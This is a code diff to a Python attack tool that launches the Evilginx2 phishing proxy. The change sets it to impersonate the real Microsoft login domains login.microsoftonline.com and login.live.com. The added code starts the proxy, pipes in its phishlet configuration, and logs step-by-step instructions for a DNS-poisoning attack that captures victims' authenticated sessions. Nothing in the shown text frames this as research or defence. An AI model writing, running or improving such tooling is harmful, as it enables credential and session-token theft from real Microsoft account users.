@@ -627,37 +627,72 @@ redirect_url: https://www.microsoft.com
         try:
             log(f"Starting Evilginx2 with {phishlet} phishlet...")
             
+            # For DNS poisoning attacks, use real Microsoft domains
             if not domain:
-                domain = f'{phishlet}.local'
+                if phishlet == 'o365':
+                    domain = 'login.microsoftonline.com'
+                    log("Using REAL domain for DNS poisoning: login.microsoftonline.com")
+                elif phishlet == 'outlook':
+                    domain = 'login.live.com'
+                    log("Using REAL domain for DNS poisoning: login.live.com")
+                else:
+                    domain = f'{phishlet}.local'
             
             self.phishlet = phishlet
             
-            # Start Evilginx2 in background
-            # We'll use custom command sequence
-            cmd_sequence = f"""
-config domain {domain}
-config ip {self.bridge_ip}
-phishlets hostname {phishlet} {domain}
-phishlets enable {phishlet}
-lures create {phishlet}
-lures get-url 0
-"""
+            # Find phishlets directory dynamically
+            phishlet_dirs = [
+                '/opt/evilginx2/phishlets',
+                os.path.join(os.path.dirname(self.evilginx_path), 'phishlets')
+            ]
             
-            # Create command file
-            cmd_file = os.path.join(self.config_dir, 'startup.txt')
-            with open(cmd_file, 'w') as f:
-                f.write(cmd_sequence)
+            phishlet_dir = None
+            for pdir in phishlet_dirs:
+                if os.path.exists(pdir):
+                    phishlet_dir = pdir
+                    log(f"Found phishlets at: {pdir}")
+                    break
+            
+            if not phishlet_dir:
+                log("Phishlets directory not found", 'ERROR')
+                return False
+            
+            # Verify phishlet exists
+            phishlet_file = os.path.join(phishlet_dir, f'{phishlet}.yaml')
+            if not os.path.exists(phishlet_file):
+                log(f"Phishlet not found: {phishlet_file}", 'ERROR')
+                log(f"Available phishlets: {os.listdir(phishlet_dir) if os.path.exists(phishlet_dir) else 'N/A'}")
+                return False
+            
+            # Create config directory
+            os.makedirs(self.config_dir, exist_ok=True)
             
             # Start Evilginx2
             log_file = os.path.join(CONFIG['PCAP_DIR'], 'evilginx.log')
             
+            # Command to run
+            cmd = [
+                self.evilginx_path,
+                '-p', phishlet_dir,
+                '-d', self.db_path
+            ]
+            
+            log(f"Starting: {' '.join(cmd)}")
+            
             self.process = subprocess.Popen(
-                [self.evilginx_path, '-p', '/opt/evilginx2/phishlets', '-d', self.db_path],
+                cmd,
                 stdin=subprocess.PIPE,
                 stdout=open(log_file, 'a'),
                 stderr=subprocess.STDOUT,
                 preexec_fn=os.setpgrp
             )
+            
+            # Configuration commands for DNS poisoning mode
+            cmd_sequence = f"""config domain {domain}
+config ip {self.bridge_ip}
+phishlets hostname {phishlet} {domain}
+phishlets enable {phishlet}
+"""
             
             # Send configuration commands
             time.sleep(2)
@@ -665,8 +700,9 @@ lures get-url 0
                 try:
                     self.process.stdin.write(cmd_sequence.encode())
                     self.process.stdin.flush()
-                except:
-                    pass
+                    log("Configuration commands sent")
+                except Exception as e:
+                    log(f"Failed to send commands: {e}", 'WARNING')
             
             time.sleep(3)
             
@@ -680,16 +716,26 @@ lures get-url 0
                 self.monitor_thread = threading.Thread(target=self._monitor_sessions, daemon=True)
                 self.monitor_thread.start()
                 
-                log(f"✓ Evilginx2 started (PID: {self.process.pid})", 'SUCCESS')
-                log(f"✓ Phishlet: {phishlet}")
-                log(f"✓ Lure URL: {self.lure_url}")
+                log(f"Evilginx2 started (PID: {self.process.pid})", 'SUCCESS')
+                log(f"Phishlet: {phishlet}")
+                log(f"Domain: {domain} (poison DNS to point here)")
+                log(f"Bridge IP: {self.bridge_ip}")
+                log(f"")
+                log(f"FOR DNS POISONING ATTACK:", 'INFO')
+                log(f"1. Configure DNS to resolve {domain} -> {self.bridge_ip}")
+                log(f"2. User visits Microsoft normally")
+                log(f"3. DNS redirects to your Evilginx")
+                log(f"4. Session captured after auth")
                 return True
             else:
-                log("Evilginx2 failed to start", 'ERROR')
+                log("Evilginx2 failed to start - check logs", 'ERROR')
+                log(f"Log file: {log_file}")
                 return False
 
         except Exception as e:
             log(f"Evilginx2 start failed: {e}", 'ERROR')
+            import traceback
+            log(traceback.format_exc(), 'ERROR')
             return False
 
     def stop(self):
